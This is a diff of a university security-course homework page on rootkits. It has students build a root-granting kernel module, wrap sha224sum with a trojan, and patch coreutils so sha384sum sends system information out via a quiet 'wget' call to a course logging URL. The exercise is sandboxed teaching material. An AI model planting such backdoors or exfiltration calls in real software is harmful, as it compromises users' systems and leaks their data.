@@ -1,15 +1,17 @@
 <!DOCTYPE html>
-<html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
 <head>
-  <meta charset="utf-8">
-  <meta name="generator" content="pandoc">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
   <title>ICS: Programming Homework: Rootkits</title>
-  <style type="text/css">code{white-space: pre;}</style>
-  <link rel="stylesheet" href="../markdown.css">
-  <!--[if lt IE 9]>
-    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
-  <![endif]-->
+  <style type="text/css">
+      code{white-space: pre-wrap;}
+      span.smallcaps{font-variant: small-caps;}
+      span.underline{text-decoration: underline;}
+      div.column{display: inline-block; vertical-align: top; width: 50%;}
+  </style>
+  <link rel="stylesheet" href="../markdown.css" />
 </head>
 <body>
 <h1 id="ics-programming-homework-rootkits">ICS: Programming Homework: Rootkits</h1>
@@ -18,17 +20,17 @@
 <p><strong><em>YOU MUST RUN THIS IN VIRTUALBOX!!!</em></strong>. You are going to <em>negatively affect the machine you develop this on</em>. Do not think that you can or should do this on your host OS and still have your computer work.</p>
 <p>We are not responsible if you render your computer inoperable because you did not follow this warning! This is why we provided the VirtualBox image!</p>
 <h3 id="backups-and-restoration">Backups and Restoration</h3>
-<p>You may well render your VirtualBox image inoperable. That's fine, as we can easily fix this. First, before you start this assignment, back up any code that you have on the VirtualBox machine that you want to save. As you are writing your program, you will want to back it up in some fashion before you attempt to run it EACH TIME you are running something that could negatively affect the system. A few options exist for that:</p>
+<p>You may well render your VirtualBox image inoperable. That’s fine, as we can easily fix this. First, before you start this assignment, back up any code that you have on the VirtualBox machine that you want to save. As you are writing your program, you will want to back it up in some fashion before you attempt to run it EACH TIME you are running something that could negatively affect the system. A few options exist for that:</p>
 <ul>
 <li>Email it to yourself</li>
-<li>Set up <a href="https://help.ubuntu.com/community/VirtualBox/SharedFolders">VirtualBox shared folders</a> and save it there -- we recommend this option, since you won't have to reconfigure it each time you wipe your VirtualBox image (you can just run the code from that folder)</li>
+<li>Set up <a href="https://help.ubuntu.com/community/VirtualBox/SharedFolders">VirtualBox shared folders</a> and save it there – we recommend this option, since you won’t have to reconfigure it each time you wipe your VirtualBox image (you can just run the code from that folder)</li>
 <li>Use git</li>
 <li>Install Dropbox</li>
 </ul>
 <p>Once you have backed up your code for this assignment, if you brick your image, you can do the following:</p>
 <ul>
 <li>Shutdown the VirtualBox machine</li>
-<li>Download the .zip of the image, if you don't have it already</li>
+<li>Download the .zip of the image, if you don’t have it already</li>
 <li>Unzip it right over the existing (and bricked) image</li>
 <li>Restart VirtualBox</li>
 <li>Copy your files back over, and you are ready to go</li>
@@ -36,36 +38,36 @@
 <h2 id="overview">Overview</h2>
 <p>In this assignment, you will investigate both types of rootkits: application and kernel. There are four tasks to be completed for submission. You will want to review the <a href="../slides/rootkits.html#/">rootkit slides</a>.</p>
 <h3 id="working-as-root">Working as root</h3>
-<p>Some of these commands will require to to execute them as the root user. You can do this by prepending <code>sudo</code> in front of the command. For example, to insert a module called <code>root.ko</code>, you would call <code>sudo insmod root.ko</code> -- this executes the <code>insmod root.ko</code> command as root.</p>
+<p>Some of these commands will require to to execute them as the root user. You can do this by prepending <code>sudo</code> in front of the command. For example, to insert a module called <code>root.ko</code>, you would call <code>sudo insmod root.ko</code> – this executes the <code>insmod root.ko</code> command as root.</p>
 <h2 id="kernel-level-rootkit">Kernel level rootkit</h2>
 <p>Recall that a Linux kernel level rootkit installs a loadable kernel module (LKM) that gives the attacker more privileges on the compromised machine. We are going to build such a module here. There are two tasks to be done for the kernel level rootkit aspect of this assignment.</p>
 <h3 id="task-1-perform-the-rootkit">Task 1: Perform the rootkit</h3>
 <p>Follow <a href="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485">this tutorial at 0x00SEC</a>. This will require that you read two sub-tutorials (<a href="http://derekmolloy.ie/writing-a-linux-kernel-module-part-1-introduction/">1</a> and <a href="http://derekmolloy.ie/writing-a-linux-kernel-module-part-2-a-character-device/">2</a>). This rootkit will allow you to gain root access on the machine from a non-root user.</p>
 <p>A few notes from those tutorials:</p>
 <ul>
-<li>You don't have to install the package that the <a href="http://derekmolloy.ie/writing-a-linux-kernel-module-part-1-introduction/">first sub-tutorial</a> states (the one obtained via <code>wget</code> and installed via <code>dpkg -i</code>), nor clone the git repo</li>
+<li>You don’t have to install the package that the <a href="http://derekmolloy.ie/writing-a-linux-kernel-module-part-1-introduction/">first sub-tutorial</a> states (the one obtained via <code>wget</code> and installed via <code>dpkg -i</code>), nor clone the git repo</li>
 <li>When creating the Makefile, recall that the indentation must be a tab, not a space (if you copy-and-paste it, it pastes as a space)</li>
 <li>For the <a href="http://derekmolloy.ie/writing-a-linux-kernel-module-part-2-a-character-device/">second sub-tutorial</a>, you have to save both ebbchar.c and testebbchar.c before the Makefile will work</li>
 </ul>
 <p>The first task for this assignment is to create this rootkit as specified in the tutorial.</p>
-<p>Note that to complete this part, you can just copy the code that is listed there -- that's the code that you have to submit, after all. However, you have to explain to us how the code works. We are looking for a half-page, and it needs to be specific enough that we see that you really understand what is going on in that code. This should go into a <code>kernel-rootkits.pdf</code> file (more content will go into that file for the next task).</p>
-<p>For submission of your code, you should put your code in a <code>root.c</code> file (the same name as in the tutorial), and put the appropriate compilation lines in the Makefile. The module name MUST be <code>root.ko</code>, otherwise we won't be able to load it ourselves.</p>
+<p>Note that to complete this part, you can just copy the code that is listed there – that’s the code that you have to submit, after all. However, you have to explain to us how the code works. We are looking for a half-page, and it needs to be specific enough that we see that you really understand what is going on in that code. This should go into a <code>kernel-rootkits.pdf</code> file (more content will go into that file for the next task).</p>
+<p>For submission of your code, you should put your code in a <code>root.c</code> file (the same name as in the tutorial), and put the appropriate compilation lines in the Makefile. The module name MUST be <code>root.ko</code>, otherwise we won’t be able to load it ourselves.</p>
 <h3 id="task-2-what-else-can-rootkits-do">Task 2: What else can rootkits do?</h3>
-<p>This was a fairly simple rootkit, as far as complexity goes, although it's a lot to learn all at once. All this does is allow one to gain root access -- useful, to be sure, but there is much more that rootkits can do.</p>
+<p>This was a fairly simple rootkit, as far as complexity goes, although it’s a lot to learn all at once. All this does is allow one to gain root access – useful, to be sure, but there is much more that rootkits can do.</p>
 <p>The second task for this assignment is to investigate other things that rootkits can perform. We are looking for specific things that can be done, not high-level mumbo-jumbo. For each thing, a sentence describing it would be sufficient. For example, the access that the rootkit that you just implemented might be phrased such as:</p>
 <ul>
 <li><em>root access</em>: by writing a known string to a character device, one can allow a non-root user to gain root access</li>
 </ul>
-<p>How many to find? That's up to you. If you have a bunch, and you are not finding anymore, then you are done. You can use Google searches, look at rootkit code online -- take a look <a href="https://github.com/f0rb1dd3n/Reptile">here</a> to start. That source code lists 12 different functionalities (one of which being giving root access to non-root users). Thus, we would expect a list of 20 or more.</p>
+<p>How many to find? That’s up to you. If you have a bunch, and you are not finding anymore, then you are done. You can use Google searches, look at rootkit code online – take a look <a href="https://github.com/f0rb1dd3n/Reptile">here</a> to start. That source code lists 12 different functionalities (one of which being giving root access to non-root users). Thus, we would expect a list of 20 or more.</p>
 <p>This part should be put into a PDF called <code>kernel-rootkits.pdf</code>; note that there will also be content in that file from the first task.</p>
 <h2 id="application-level-rootkit">Application level rootkit</h2>
 <p>Recall that an application level rootkit will replace specific utilities with compromised versions. There are two tasks to be done for the application level rootkit aspect of this assignment.</p>
 <h3 id="task-3-use-of-a-wrapper-file">Task 3: Use of a wrapper file</h3>
-<p>You are going to create a &quot;wrapper&quot; program that will perform the &quot;malicious&quot; task, and then call the original program. For this one, we will attack the <code>sha224sum</code> program, which is located at <code>/usr/bin/sha224sum</code>. We chose this file because it's not all that critical, and if it gets messed up, you can still use the operating system.</p>
+<p>You are going to create a “wrapper” program that will perform the “malicious” task, and then call the original program. For this one, we will attack the <code>sha224sum</code> program, which is located at <code>/usr/bin/sha224sum</code>. We chose this file because it’s not all that critical, and if it gets messed up, you can still use the operating system.</p>
 <p>The <code>sha224sum</code> program has a number of command-line parameters that it accepts. See <a href="https://www.systutorials.com/docs/linux/man/1-sha224sum/">here</a> for a list of these. Note that different versions of sha224sum, as well as different OSes, will have different options. In particular, you cannot assume any particular set of options.</p>
 <p>First, <em>BACK UP THE PROGRAM</em>. For example: <code>sudo cp /usr/bin/sha224sum /usr/bin/sha224sum.bak</code>. This way if you mess up, you can easily restore it.</p>
-<p>Next, copy the sha224sum program to another name -- we will use <code>/usr/bin/sha224sum.original</code> for this task. When we test your program, we are going to rename our <code>/usr/bin/sha224sum</code> to <code>/usr/bin/sha224sum.original</code>, so if you use a different name, your submission will not work.</p>
-<p>You are going to write a wrapper program that you will name <code>sha224sum</code>, and put it in <code>/usr/bin/</code> -- thus, when you normally call <code>sha224sum</code>, it will call your wrapper file. Your wrapper file will then call the renamed (and original) <code>sha224sum.original</code>.</p>
+<p>Next, copy the sha224sum program to another name – we will use <code>/usr/bin/sha224sum.original</code> for this task. When we test your program, we are going to rename our <code>/usr/bin/sha224sum</code> to <code>/usr/bin/sha224sum.original</code>, so if you use a different name, your submission will not work.</p>
+<p>You are going to write a wrapper program that you will name <code>sha224sum</code>, and put it in <code>/usr/bin/</code> – thus, when you normally call <code>sha224sum</code>, it will call your wrapper file. Your wrapper file will then call the renamed (and original) <code>sha224sum.original</code>.</p>
 <ul>
 <li>Whenever run, it will print out a one-line witty quote</li>
 <li>If the <code>--be-evil</code> flag is passed (note the two leading dashes!), it will print out some (different) witty multi-line quote</li>
@@ -74,46 +76,46 @@
 <p>Thus, once installed, if you were to call <code>sha224sum &lt;file&gt;</code>, it would print out the witty one-line quote and then the SHA-224 sum.</p>
 <p>You can do this in any language that you want:</p>
 <ul>
-<li>A bash shell script will be the shortest, but familiarize yourself with how to deal command-line parameters in bash -- you can see the cryptmoney.sh shell script in the <a href="hw-cryptocurrency.html">cryptocurrency</a> (<a href="hw-cryptocurrency.md">md</a>) homework for examples</li>
+<li>A bash shell script will be the shortest, but familiarize yourself with how to deal command-line parameters in bash – you can see the cryptmoney.sh shell script in the <a href="hw-cryptocurrency.html">cryptocurrency</a> (<a href="hw-cryptocurrency.md">md</a>) homework for examples</li>
 <li>C/C++ program: if you need a refresher as to how to parse command-line parameters, see <a href="https://uva-cs.github.io/pdr/slides/04-arrays-bigoh.html#/cmdlineparams">this slide from CS 2150</a> and the source code linked to on that page; to execute another program, you will want to use the <a href="https://www.systutorials.com/docs/linux/man/3-exec/">execl()</a> C function, which is in the <code>&lt;unistd.h&gt;</code> library.</li>
-<li>We can't use Java -- we need the executable name to be <code>sha224sum</code>, not <code>sha224sum.class</code></li>
-<li>Python 3 is fine -- be sure to put <code>#!/usr/bin/python3</code> and run <code>chmod 755 &lt;scriptfilename&gt;</code> on the file</li>
+<li>We can’t use Java – we need the executable name to be <code>sha224sum</code>, not <code>sha224sum.class</code></li>
+<li>Python 3 is fine – be sure to put <code>#!/usr/bin/python3</code> and run <code>chmod 755 &lt;scriptfilename&gt;</code> on the file</li>
 <li>We also support Go (version 1.10)!</li>
 </ul>
-<p>For this assignment, you should name your source code file <code>sha224sum-fake.?</code> where the &quot;?&quot; is the appropriate filename extension (use 'sh' for a shell script).</p>
+<p>For this assignment, you should name your source code file <code>sha224sum-fake.?</code> where the “?” is the appropriate filename extension (use ‘sh’ for a shell script).</p>
 <p>Your Makefile MUST create a <code>sha224sum</code> <em>executable</em> file. If your code requires compilation, then compile it to the <code>sha224sum</code> file name. If you are using a scripting language (Python or bash), then copy the file over <em>WITHOUT</em> a .py or .sh extension. If you are using C, C++, or Go, then compile it to that file name. We are going to run <code>make</code>, then assume that the <code>sha224sum</code> file is present.</p>
 <h3 id="task-4-modify-the-source-code">Task 4: Modify the source code</h3>
-<p>For this task, we will attack the <code>sha384sum</code> binary, for similar reasons as the previous task -- it's not likely to be critical to your OS booting.</p>
+<p>For this task, we will attack the <code>sha384sum</code> binary, for similar reasons as the previous task – it’s not likely to be critical to your OS booting.</p>
 <p>First, <em>BACK UP THE PROGRAM</em>. For example: <code>sudo cp /usr/bin/sha384sum /usr/bin/sha384sum.bak</code>. This way if you mess up, you can easily restore it.</p>
-<p>For this fourth task we are going to modify the source code to insert our compromise into the program itself. Linux is open source, and all of the core utilities are GNU, so their source code is freely available. You can download the latest (highest-numbered) version from <a href="https://ftp.gnu.org/gnu/coreutils/" class="uri">https://ftp.gnu.org/gnu/coreutils/</a> -- at the time of this writing, it's 8.31. The coreutils are the basic utilities used by all Linux systems -- ls, cp, mv, etc. Once you've downloaded it, uncompress it (<code>tar xfa coreutils-8.31.tar.xz</code>). Once in that directory, run <code>./configure</code> then <code>make</code>. This will work on the VirtualBox image -- you are on your own if you are using your own computer's OS.</p>
-<p>The source code for the various files in coreutils is all inter-dependent on each other, and it's not worth our time for this assignment to figure out the details or try to separate it. So you are going to edit the appropriate files in the coreutils archive and compile it with the Makefile that the archive provides. The <code>main()</code> function for the sha384sum binary is in src/md5sum.c (SHA-1 was originally added as an &quot;extension&quot; of MD5, and it stayed that way as successive SHA versions were created). Once you modify that file, you can run <code>make src/sha384sum</code>.</p>
+<p>For this fourth task we are going to modify the source code to insert our compromise into the program itself. Linux is open source, and all of the core utilities are GNU, so their source code is freely available. You can download the latest (highest-numbered) version from <a href="https://ftp.gnu.org/gnu/coreutils/">https://ftp.gnu.org/gnu/coreutils/</a> – at the time of this writing, it’s 8.31. The coreutils are the basic utilities used by all Linux systems – ls, cp, mv, etc. Once you’ve downloaded it, uncompress it (<code>tar xfa coreutils-8.31.tar.xz</code>). Once in that directory, run <code>./configure</code> then <code>make</code>. This will work on the VirtualBox image – you are on your own if you are using your own computer’s OS.</p>
+<p>The source code for the various files in coreutils is all inter-dependent on each other, and it’s not worth our time for this assignment to figure out the details or try to separate it. So you are going to edit the appropriate files in the coreutils archive and compile it with the Makefile that the archive provides. The <code>main()</code> function for the sha384sum binary is in src/md5sum.c (SHA-1 was originally added as an “extension” of MD5, and it stayed that way as successive SHA versions were created). Once you modify that file, you can run <code>make src/sha384sum</code>.</p>
 <p>To ensure that you can get it to work, put a <code>printf()</code> statement in the top of the <code>main()</code> method in <code>md5sum.c</code>, then run <code>make src/sha384sum</code>. When you run the command (<code>src/sha384sum &lt;file&gt;</code>), it should print your output from the <code>printf()</code> line, then the 384-bit SHA hash. Then remove that <code>printf()</code> statement.</p>
 <p>The challenge for this task is that you have to find out some information about the host system and then send that over a network connection. This all has to happen when <code>sha384sum</code> is run.</p>
-<p>One can find out a lot of information about the system. For this part, though, we aren't as focused on <em>what</em> you can find out, but instead <em>how</em> you send that information back. The information we want is the output of <code>lsb_release -a</code>. On the VirtualBox image, it would print out:</p>
+<p>One can find out a lot of information about the system. For this part, though, we aren’t as focused on <em>what</em> you can find out, but instead <em>how</em> you send that information back. The information we want is the output of <code>lsb_release -a</code>. On the VirtualBox image, it would print out:</p>
 <pre><code>No LSB modules are available.
 Distributor ID: Ubuntu
 Description:    Ubuntu 18.04.2 LTS
 Release:        18.04
 Codename:       bionic</code></pre>
-<p>Note that the first line will vary, as that is reporting on the hardware on your machine (mine said &quot;LSB Version: core-9.20170808ubuntu1-noarch:security-9.20170808ubuntu1-noarch&quot;). Also note that this is multiple lines -- how you send it back is up to you. It can be multiple calls (one per line) -- or, more easily, just one call. It's fine if you just remove spaces and newlines so that the text sent back is:</p>
+<p>Note that the first line will vary, as that is reporting on the hardware on your machine (mine said “LSB Version: core-9.20170808ubuntu1-noarch:security-9.20170808ubuntu1-noarch”). Also note that this is multiple lines – how you send it back is up to you. It can be multiple calls (one per line) – or, more easily, just one call. It’s fine if you just remove spaces and newlines so that the text sent back is:</p>
 <pre><code>NoLSBmodulesareavailable.DistributorID:UbuntuDescription:Ubuntu18.04.2LTSRelease:18.04Codename:bionic</code></pre>
-<p>You can even replace all spaces with underscores, if you wish. We are less focused on text formatting and more on the obtaining and transmission of the information. And if your system does not print the first line (&quot;No LSB modules are available.&quot;), that's fine as well.</p>
+<p>You can even replace all spaces with underscores, if you wish. We are less focused on text formatting and more on the obtaining and transmission of the information. And if your system does not print the first line (“No LSB modules are available.”), that’s fine as well.</p>
 <p>From the C code, you will need to execute a command-line program and capture the output. There are a few ways to do this:</p>
 <ul>
-<li>You can do this as series of command-line arguments that create a file, and then read in that file. For example, <code>system(&quot;command &gt;   filename.txt&quot;);</code> will create the file, and then you can look into file I/O to read in that file (see the <a href="https://uva-cs.github.io/pdr/labs/lab10/fileio.cpp.html">fileio.cpp</a> program from CS 2150's Huffman coding lab as an example)</li>
-<li>You can call the command directly (without redirecting it to a file) from C -- see the code <a href="https://stackoverflow.com/questions/7292642/grabbing-output-from-exec">here</a> for how to do this (you can copy the code at that link for this assignment).</li>
+<li>You can do this as series of command-line arguments that create a file, and then read in that file. For example, <code>system("command &gt; filename.txt");</code> will create the file, and then you can look into file I/O to read in that file (see the <a href="https://uva-cs.github.io/pdr/labs/lab10/fileio.cpp.html">fileio.cpp</a> program from CS 2150’s Huffman coding lab as an example)</li>
+<li>You can call the command directly (without redirecting it to a file) from C – see the code <a href="https://stackoverflow.com/questions/7292642/grabbing-output-from-exec">here</a> for how to do this (you can copy the code at that link for this assignment).</li>
 </ul>
-<p>You will then need to transmit this over the network. To simplify it, you just call a URL: <a href="https://libra.cs.virginia.edu/rootkit.php?userid=mst3k&amp;data=..." class="uri">https://libra.cs.virginia.edu/rootkit.php?userid=mst3k&amp;data=...</a> where mst3k is your userid and the <code>...</code> is the data you are sending. You can do this via a <code>wget</code> call (again, executing a command-line program from the C/C++ program via <a href="https://www.systutorials.com/docs/linux/man/3-exec/">execl()</a>): <code>wget https://libra.cs.virginia.edu/rootkit.php?userid=mst3k&amp;data=...</code>. This puts the information into the apache web server log. There are more efficient ways to do this, but putting it into the apache log is fine for this assignment. Note that you should supress the output from the <code>wget</code> call -- you can do this with the <code>-q</code> flag.</p>
+<p>You will then need to transmit this over the network. To simplify it, you just call a URL: <a href="https://libra.cs.virginia.edu/rootkit.php?userid=mst3k&amp;data=...">https://libra.cs.virginia.edu/rootkit.php?userid=mst3k&amp;data=…</a> where mst3k is your userid and the <code>...</code> is the data you are sending. You can do this via a <code>wget</code> call (again, executing a command-line program from the C/C++ program via <a href="https://www.systutorials.com/docs/linux/man/3-exec/">execl()</a>): <code>wget https://libra.cs.virginia.edu/rootkit.php?userid=mst3k&amp;data=...</code>. This puts the information into the apache web server log. There are more efficient ways to do this, but putting it into the apache log is fine for this assignment. Note that you should supress the output from the <code>wget</code> call – you can do this with the <code>-q</code> flag.</p>
 <p>You may also want to familiarize yourself with the <a href="https://www.systutorials.com/docs/linux/man/3-system">system()</a> function.</p>
-<p>To see what information has been sent, go directly to the <a href="https://libra.cs.virginia.edu/rootkit.php" class="uri">https://libra.cs.virginia.edu/rootkit.php</a> URL. Once you log in with Netbadge, you will be able to see all the data sent in under that userid.</p>
-<p>Note that the logs that are displayed only keep the information sent in the last few hours -- we will look at the entire log history when we grade the assignment, but the information that you see will be only the most recent. So don't worry if the entries that you saw on a previous day are no longer present. As long as they were there at <em>some</em> point, we'll see them when we grade the assignment.</p>
+<p>To see what information has been sent, go directly to the <a href="https://libra.cs.virginia.edu/rootkit.php">https://libra.cs.virginia.edu/rootkit.php</a> URL. Once you log in with Netbadge, you will be able to see all the data sent in under that userid.</p>
+<p>Note that the logs that are displayed only keep the information sent in the last few hours – we will look at the entire log history when we grade the assignment, but the information that you see will be only the most recent. So don’t worry if the entries that you saw on a previous day are no longer present. As long as they were there at <em>some</em> point, we’ll see them when we grade the assignment.</p>
 <p>The only file you should submit from this is the modified <code>md5sum.c</code> file. We will unpack and configure the entire coreutils archive, put the md5sum.c file in there, and then recompile the <code>sha384sum</code> program. Thus, you do NOT need anything in your Makefile for this task</p>
 <h2 id="hints-and-tips">Hints and tips</h2>
-<p>We've collected a few of these here...</p>
+<p>We’ve collected a few of these here…</p>
 <ul>
-<li>The <code>which</code> command in linux tells you where the specified system binary is in the filesystem; for example, if you enter 'which ls', the path to the ls binary (/bin/ls) should be printed out</li>
+<li>The <code>which</code> command in linux tells you where the specified system binary is in the filesystem; for example, if you enter ‘which ls’, the path to the ls binary (/bin/ls) should be printed out</li>
 <li>Similarly, the <code>PATH</code> environment variable indicates all the possible locations that the system looks for when you want to execute a command. You can view it with <code>echo $PATH</code></li>
-<li>If you finished the backdoored <code>sha224sum</code> rootkit, but it's not printing out anything, consider flushing out stdout to force print the contents in the stdout buffer.</li>
+<li>If you finished the backdoored <code>sha224sum</code> rootkit, but it’s not printing out anything, consider flushing out stdout to force print the contents in the stdout buffer.</li>
 <li><code>exec()</code> refers to a family of functions that can execute other processes; we recommend using <code>execl()</code> for this assignment (though you are free to do otherwise!)</li>
 </ul>
 <h2 id="submission">Submission</h2>
@@ -121,13 +123,13 @@ Codename:       bionic</code></pre>
 <ul>
 <li><code>root.c</code> from task 1</li>
 <li><code>kernel-rootkits.pdf</code> from tasks 1 and 2</li>
-<li><code>sha224sum-fake.?</code> from task 3 (replace '?' with the appropriate file extension)</li>
+<li><code>sha224sum-fake.?</code> from task 3 (replace ‘?’ with the appropriate file extension)</li>
 <li><code>md5sum.c</code> from task 4</li>
-<li>A <code>Makefile</code> -- see below</li>
+<li>A <code>Makefile</code> – see below</li>
 </ul>
 <p>The primary Makefile target must:</p>
 <ul>
-<li>Compile the rootkit from task 1 to a <code>root.ko</code> module -- the compilation line from the tutorial is sufficient</li>
+<li>Compile the rootkit from task 1 to a <code>root.ko</code> module – the compilation line from the tutorial is sufficient</li>
 <li>For task 3, either compile a C / C++ / Go program to <code>sha224sum</code> or copy the Python / bash script to the same file name (with no extension!)</li>
 </ul>
 <p>Below is the Makefile that we used (recall that the indendatation in the Makefile must be tabs, not spaces), however your mileage may vary.</p>
